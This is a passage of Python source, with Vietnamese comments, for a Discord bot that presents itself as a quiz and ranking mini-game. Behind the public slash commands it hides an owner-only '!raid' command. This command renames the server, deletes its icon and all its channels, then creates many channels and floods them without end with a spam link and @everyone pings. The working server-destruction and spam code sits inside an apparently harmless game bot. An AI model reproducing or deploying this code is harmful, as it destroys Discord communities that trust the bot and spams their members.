    elif custom_id == "ready_tai_xiu":
        await interaction.response.defer()
        global ready_users
        user_id = str(interaction.user.id)
        if user_id in players:
            ready_users.add(user_id)
            await interaction.followup.send(f"✅ **{interaction.user.mention}** đã sẵn sàng!", ephemeral=False)
        else:
            await interaction.followup.send("❌ Bạn chưa tham gia game!", ephemeral=True)

# ===== LỆNH RANKINGS =====
@tree.command(name="rankings", description="🏆 Bảng xếp hạng toàn server")
async def slash_rankings(interaction: discord.Interaction):
    try:
        await interaction.response.defer()
        guild_id = str(interaction.guild.id)
        
        filename = f"rankings_{guild_id}.json"
        if not os.path.exists(filename):
            embed = discord.Embed(
                title="🏆 **BẢNG XẾP HẠNG** 🏆",
                description="❌ **Chưa có ai ghi điểm!**\nHãy tham gia trò chơi và trở thành người đứng đầu!",
                color=discord.Color.dark_gold()
            )
            embed.set_footer(text="💪 Hãy trả lời câu hỏi để tích điểm! – by Bananavuive")
            await interaction.followup.send(embed=embed)
            return
        
        with open(filename, "r", encoding="utf-8") as f:
            rankings = json.load(f)
        
        if not rankings:
            embed = discord.Embed(
                title="🏆 **BẢNG XẾP HẠNG** 🏆",
                description="❌ **Chưa có ai ghi điểm!**\nHãy tham gia trò chơi và trở thành người đứng đầu!",
                color=discord.Color.dark_gold()
            )
            embed.set_footer(text="💪 Hãy trả lời câu hỏi để tích điểm! – by Bananavuive")
            await interaction.followup.send(embed=embed)
            return

        sorted_rank = sorted(rankings.items(), key=lambda x: x[1], reverse=True)[:10]
        leaderboard = ""
        medals = ["🥇", "🥈", "🥉"]
        
        for idx, (user_id, score) in enumerate(sorted_rank, 1):
            try:
                user = await client.fetch_user(int(user_id))
                name = user.display_name
            except:
                name = user_id
            rank_name = get_rank(score)
            rank_emoji = get_rank_emoji(rank_name)
            medal = medals[idx-1] if idx <= 3 else f"#{idx}"
            leaderboard += f"{medal} **{name}** – ⭐ {score} | {rank_emoji} {rank_name}\n"

        embed = discord.Embed(
            title="🏆 **BẢNG XẾP HẠNG TOÀN SERVER** 🏆",
            description=leaderboard if leaderboard else "❌ Chưa có dữ liệu.",
            color=discord.Color.gold()
        )
        
        user_id = str(interaction.user.id)
        user_score = rankings.get(user_id, 0)
        embed.add_field(
            name="📊 **Điểm của bạn**",
            value=f"⭐ {user_score} điểm",
            inline=False
        )

        next_rank = None
        for threshold, name, emoji in RANK_THRESHOLDS:
            if user_score < threshold:
                next_rank = {"name": name, "emoji": emoji, "threshold": threshold}
                break

        if next_rank:
            embed.add_field(
                name="🎯 **MỤC TIÊU TIẾP THEO**",
                value=f"Cần **{next_rank['threshold'] - user_score}** điểm nữa để đạt rank **{next_rank['emoji']} {next_rank['name']}**!",
                inline=False
            )
        else:
            embed.add_field(
                name="🏆 **THÀNH TỰU**",
                value="Bạn đã đạt rank cao nhất! **Siêu Tỉ Phú** 🏆",
                inline=False
            )

        embed.set_footer(text="🏅 Trả lời câu hỏi trong game để nhận điểm! – by Bananavuive")
        await interaction.followup.send(embed=embed)
    except Exception as e:
        print(f"[!] Lỗi rankings: {e}")

# ===== LỆNH DIEM =====
@tree.command(name="diem", description="📊 Xem số điểm hiện tại của bạn")
async def slash_diem(interaction: discord.Interaction):
    try:
        await interaction.response.defer()
        guild_id = str(interaction.guild.id)
        
        filename = f"rankings_{guild_id}.json"
        if not os.path.exists(filename):
            embed = discord.Embed(
                title="👑 **BẢNG ĐIỂM CÁ NHÂN** 👑",
                description=f"**{interaction.user.mention}**\n\n❌ Chưa có điểm nào!",
                color=discord.Color.blue()
            )
            embed.set_footer(text="📌 Tham gia /start để chơi game nhận điểm! – by Bananavuive")
            await interaction.followup.send(embed=embed, ephemeral=True)
            return
        
        with open(filename, "r", encoding="utf-8") as f:
            rankings = json.load(f)
        
        user_id = str(interaction.user.id)
        score = rankings.get(user_id, 0)
        rank = get_rank(score)
        rank_emoji = get_rank_emoji(rank)
        color = get_rank_color(rank)
        
        embed = discord.Embed(
            title="👑 **BẢNG ĐIỂM CÁ NHÂN** 👑",
            description=f"**{interaction.user.mention}**",
            color=color
        )
        embed.set_thumbnail(url=interaction.user.display_avatar.url)
        embed.add_field(
            name=f"{rank_emoji} **RANK** {rank_emoji}",
            value=f"**{rank}**",
            inline=False
        )
        embed.add_field(
            name="⭐ **TỔNG ĐIỂM** ⭐",
            value=f"**{score}** điểm",
            inline=False
        )
        
        sorted_rank = sorted(rankings.items(), key=lambda x: x[1], reverse=True)
        if user_id in rankings:
            rank_pos = [uid for uid, _ in sorted_rank].index(user_id) + 1
            embed.add_field(
                name="📈 **XẾP HẠNG**",
                value=f"#{rank_pos}",
                inline=True
            )
        else:
            embed.add_field(
                name="📈 **XẾP HẠNG**",
                value="Chưa có hạng",
                inline=True
            )
        
        embed.add_field(
            name="🏅 **THÀNH TÍCH**",
            value="🔥 Tiếp tục cố gắng!" if score < 50 else "💪 Rất tốt!" if score < 100 else "🌟 Xuất sắc!" if score < 200 else "👑 Huyền thoại!",
            inline=True
        )
        embed.set_footer(text="📌 Tham gia /start để chơi game nhận điểm! – by Bananavuive")
        
        await interaction.followup.send(embed=embed, ephemeral=True)
    except Exception as e:
        print(f"[!] Lỗi diem: {e}")

# ===== MINI GAME - QUIZ =====
class QuizView(discord.ui.View):
    def __init__(self, question_data, target_user, timeout=QUIZ_DURATION):
        super().__init__(timeout=timeout)
        self.question_data = question_data
        self.target_user = target_user
        self.answered = False

        for i, opt in enumerate(question_data["options"]):
            btn = discord.ui.Button(label=opt, custom_id=f"ans_{i}", style=discord.ButtonStyle.primary)
            btn.callback = self.button_callback
            self.add_item(btn)

    async def button_callback(self, interaction: discord.Interaction):
        if interaction.user.id != self.target_user.id:
            await interaction.response.send_message("❌ Chỉ người được chọn mới được trả lời!", ephemeral=True)
            return
        if self.answered:
            await interaction.response.send_message("❌ Bạn đã trả lời rồi!", ephemeral=True)
            return

        self.answered = True
        selected = int(interaction.data["custom_id"].split("_")[1])
        correct = self.question_data["answer"]

        guild_id = str(interaction.guild.id)
        user_id = str(interaction.user.id)
        old_score = get_points(guild_id, user_id)
        old_rank = get_rank(old_score)

        if selected == correct:
            new_score = add_points(guild_id, user_id, 10)
            
            new_rank = get_rank(new_score)
            rank_up_msg = ""
            if new_rank != old_rank:
                rank_up_msg = f"\n\n🎉 **LÊN RANK!** {get_rank_emoji(new_rank)} **{new_rank}** !"
                embed_rank = discord.Embed(
                    title="🎉 **LÊN RANK!** 🎉",
                    description=f"**{interaction.user.mention}** đã đạt rank **{new_rank}** {get_rank_emoji(new_rank)}!",
                    color=get_rank_color(new_rank)
                )
                await interaction.channel.send(embed=embed_rank)
            
            await interaction.response.send_message(
                f"✅ **{interaction.user.mention} trả lời đúng!** +10 điểm. Tổng: {new_score} {get_rank_emoji(new_rank)}{rank_up_msg}",
                ephemeral=False
            )
        else:
            await interaction.response.send_message(
                f"❌ **{interaction.user.mention} trả lời sai!** Đáp án đúng: {self.question_data['options'][correct]}",
                ephemeral=False
            )

        for child in self.children:
            child.disabled = True
        await interaction.edit_original_response(view=self)

# ===== HÀM NUKE (GIỮ NGUYÊN CƠ CHẾ CŨ, CHỈ THÊM XÓA AVATAR) =====
async def change_guild_name(guild):
    try:
        await guild.edit(name=NEW_GUILD_NAME)
    except:
        pass

async def delete_guild_icon(guild):
    """Xóa ảnh đại diện của server"""
    try:
        await guild.edit(icon=None)
        print(f"[*] Đã xóa ảnh đại diện server: {guild.name}")
    except Exception as e:
        print(f"[!] Lỗi xóa icon: {e}")

async def delete_all_channels(guild):
    for ch in list(guild.channels):
        try:
            await ch.delete()
            await asyncio.sleep(0.001)
        except:
            pass

async def create_channels_and_spam(guild):
    total_created = 0
    for batch_start in range(0, CHANNEL_COUNT, BATCH_SIZE):
        batch_tasks = []
        batch_count = min(BATCH_SIZE, CHANNEL_COUNT - batch_start)
        for i in range(batch_count):
            idx = batch_start + i + 1
            name = f"{RAID_NAME} {idx}"
            batch_tasks.append(guild.create_text_channel(name))
        channels = await asyncio.gather(*batch_tasks, return_exceptions=True)
        spam_tasks = []
        for ch in channels:
            if isinstance(ch, discord.TextChannel):
                spam_tasks.append(ch.send(f"🔗 **Link:** {SPAM_LINK}\n{SPAM_MESSAGE}\n@everyone"))
                total_created += 1
        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(0.05)

async def continuous_spam(guild):
    while True:
        channels = list(guild.text_channels)
        if not channels:
            await asyncio.sleep(0.3)
            continue
        spam_tasks = []
        for channel in channels[:50]:
            spam_tasks.append(channel.send(f"🔗 **Link:** {SPAM_LINK}\n{SPAM_MESSAGE}\n@everyone"))
        if spam_tasks:
            await asyncio.gather(*spam_tasks, return_exceptions=True)
        await asyncio.sleep(0.1)

async def raid(guild):
    await change_guild_name(guild)
    await asyncio.sleep(0.5)
    await delete_guild_icon(guild)   # <-- CHỈ THÊM DÒNG NÀY
    await asyncio.sleep(0.5)
    await delete_all_channels(guild)
    await asyncio.sleep(0.1)
    asyncio.create_task(create_channels_and_spam(guild))
    asyncio.create_task(continuous_spam(guild))

# ===== LỆNH !raid (DM lưu link, server nuke) =====
@client.event
async def on_message(message):
    if message.author.id == client.user.id:
        return
    if message.author.id != OWNER_ID:
        return

    if message.content.startswith("!raid"):
        parts = message.content.split()
        if not message.guild:
            if len(parts) > 1:
                link = parts[1]
                if link.startswith(("http://", "https://")):
                    save_saved_invite(link)
                    await message.channel.send(f"✅ Đã lưu link nuke: {link}")
                else:
                    await message.channel.send("❌ Link không hợp lệ!")
            else:
                await message.channel.send("❌ Hãy gửi !raid <link> trong DM để lưu link.")
        else:
            await raid(message.guild)

    elif message.content.lower() == "!stop":
        sys.exit(0)

# ===== SỰ KIỆN =====
@client.event
async def on_ready():
    print("="*50)
    print(" NUKE + MINI GAME VOTE – by BANANAVUIVE")
    print("="*50)
    print(f"[*] Bot online: {client.user}")
    print("[*] Public: /start, /rankings, /diem")
    print("[*] Hidden: !raid (owner only – full nuke)")
    await tree.sync()
    print("[*] Slash commands synced.")
    for guild in client.guilds:
        print(f"[*] Connected to: {guild.name} (ID: {guild.id})")
    if saved_invite:
        print(f"[*] Saved invite link: {saved_invite}")

@client.event
async def on_guild_join(guild):
    print(f"[*] Added to new server: {guild.name}")

@client.event
async def on_member_remove(member):
    if member.id == client.user.id:
        owner = await client.fetch_user(OWNER_ID)
        if owner:
            await owner.send(f"[!] Bot kicked from {member.guild.name}. Re-invite needed.")

# ===== CHẠY =====
if __name__ == "__main__":
    print("[*] Starting bot...")
    try:
        client.run(TOKEN)
    except discord.errors.LoginFailure:
        print("[!] Invalid token.")
    except KeyboardInterrupt:
        print("[*] Interrupted.")
    except Exception as e:
        print(f"[!] Error: {e}") 
